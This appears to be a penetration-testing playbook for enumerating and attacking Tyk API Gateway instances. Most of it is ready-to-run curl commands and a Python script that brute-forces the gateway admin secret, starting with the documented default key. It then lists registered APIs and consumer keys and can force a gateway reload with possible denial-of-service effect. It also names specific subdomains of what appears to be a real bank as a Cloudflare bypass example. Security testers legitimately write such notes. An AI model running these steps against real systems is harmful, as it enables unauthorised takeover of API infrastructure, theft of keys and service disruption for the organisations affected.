# Tyk API Gateway Enumeration

## When to Use
- Target uses Tyk API Gateway (detected via `/hello` health endpoint, `X-Tyk-*` headers, or "Requested endpoint is forbidden" error message)
- Common in fintech/banking (API management layer in front of microservices)

## Discovery

### Health Endpoint (Unauthenticated)
```bash
curl -sk https://TARGET/hello
```

**Positive response:**
```json
{"status":"pass","version":"5.5.2","description":"Tyk GW","details":{"dashboard":{"status":"pass","componentType":"system","time":"..."},"redis":{"status":"pass","componentType":"datastore","time":"..."}}}
```

Reveals: exact version, backend components (Redis, Dashboard), connectivity status.

### Error Fingerprint
```json
{"error": "Requested endpoint is forbidden"}
```
50-byte response with this message = Tyk blocking the path (API not registered or auth required).

## Admin API Enumeration

Tyk admin API requires `x-tyk-authorization` header with the admin secret.

```bash
# Check if admin endpoints exist (will return 403 with specific message)
for path in /tyk/keys /tyk/apis /tyk/reload /tyk/health /tyk/org/keys; do
  curl -sk "https://TARGET${path}" -w "\n%{http_code}" | tail -2
done
```

**403 response (admin API exists but secret required):**
```json
{"status":"error","message":"Attempted administrative access with invalid or missing key!"}
```

### Admin Secret Brute Force
```python
import httpx

secrets = [
    '352d20ee67be67f6340b4c0605b044b7',  # default from Tyk docs
    'secret', 'admin', 'tyk', 'password', '12345', 'changeme',
]

for secret in secrets:
    r = httpx.get('https://TARGET/tyk/apis',
                  headers={'x-tyk-authorization': secret}, verify=False, timeout=5)
    if r.status_code != 403:
        print(f"SECRET FOUND: '{secret}' → {r.status_code}")
        break
```

### If Admin Secret Found
```bash
# List all registered APIs
curl -sk -H "x-tyk-authorization: SECRET" https://TARGET/tyk/apis

# List API keys
curl -sk -H "x-tyk-authorization: SECRET" https://TARGET/tyk/keys

# Reload gateway (DoS potential)
curl -sk -H "x-tyk-authorization: SECRET" https://TARGET/tyk/reload/group

# Get gateway health
curl -sk -H "x-tyk-authorization: SECRET" https://TARGET/tyk/health
```

## Bypass Techniques

### Inconsistent CF API Shield
When some Tyk gateways are behind Cloudflare API Shield but others aren't:
- `api.jago.com/hello` → 401 (CF blocks)
- `jagobisnis.jago.com/hello` → 200 (CF not configured)

Always test `/hello` on ALL subdomains that resolve to the same infrastructure — CF API Shield rules are per-hostname.

### Path-Based API Discovery
Tyk returns different errors for registered vs unregistered APIs:
- Registered but auth required: `403` + `"Requested endpoint is forbidden"` (50B)
- Not registered: falls through to backend (404, SPA catch-all, etc.)

Use this differential to enumerate which API paths are registered in the gateway:
```bash
# If /api/v1/users returns 403 (50B) but /api/v1/random returns SPA (1445B)
# → /api/v1/users is a real registered API
ffuf -u https://TARGET/api/v1/FUZZ -w wordlist.txt -mc 403 -fs <spa-size>
```

## Findings Classification

| Finding | Severity | Condition |
|---------|----------|-----------|
| Admin secret found (default/weak) | Critical | Full API gateway control |
| /hello exposed (version + health) | Low | Info disclosure only |
| API path enumeration via 403 differential | Info | Enables further testing |

## Pitfalls
- `/hello` is Tyk-specific — don't confuse with generic health endpoints
- Tyk admin API is separate from the proxied APIs — different auth mechanism
- Version disclosure alone is Low unless a matching CVE exists (check GitHub advisories)
- `x-tyk-authorization` is NOT the same as API consumer keys — it's the gateway admin secret
- Rate limiting on Tyk is per-API policy — some paths may have different limits than others
